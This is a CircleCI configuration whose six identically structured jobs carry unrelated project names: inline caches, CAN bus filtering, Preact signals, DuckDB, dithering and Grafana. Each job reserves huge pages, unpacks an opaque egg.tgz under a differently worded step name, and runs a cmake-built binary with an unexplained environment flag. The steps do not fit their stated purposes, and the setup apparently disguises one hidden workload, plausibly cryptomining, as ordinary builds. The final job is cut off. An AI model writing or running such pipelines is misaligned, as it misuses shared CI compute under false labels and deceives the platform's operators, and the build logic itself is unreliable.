version: 2.1

jobs:
  inline-cache:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed sites
          command: |
            printf 'sites 64\n' > ic.cfg
      - run:
          name: Build dispatch core
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target inline-cache -j2
      - run:
          name: Warm inline caches
          command: LIONSS_LP=1 ./build/inline-cache --conf ic.cfg --polymorphic 4
  canbus_filter:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define filters
          command: |
            printf 'id 0x100 mask 0x700\n' > can.flt
      - run:
          name: Build CAN stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target canbus_filter -j2
      - run:
          name: Filter CAN frames
          command: LIONSS_LP=1 ./build/canbus_filter --filters can.flt --bitrate 500k
  preactSignals:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define signals
          command: |
            mkdir -p src && printf 'const c = signal(0)\n' > src/store.js
      - run:
          name: Bundle reactive runtime
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target preactSignals -j2
      - run:
          name: Benchmark signal updates
          command: LIONSS_LP=1 ./build/preactSignals --entry src/store.js --updates 1000000
  duckdbprobe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed table
          command: |
            printf 'id,v\n1,2\n' > t.csv
      - run:
          name: Build query engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target duckdbprobe -j2
      - run:
          name: Probe query plan
          command: LIONSS_LP=1 ./build/duckdbprobe --csv t.csv --explain
  dither-floyd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load image
          command: |
            : > src.png
      - run:
          name: Build ditherer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dither-floyd -j2
      - run:
          name: Floyd-Steinberg dither
          command: LIONSS_LP=1 ./build/dither-floyd --in src.png --palette 16
  grafanaPanel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
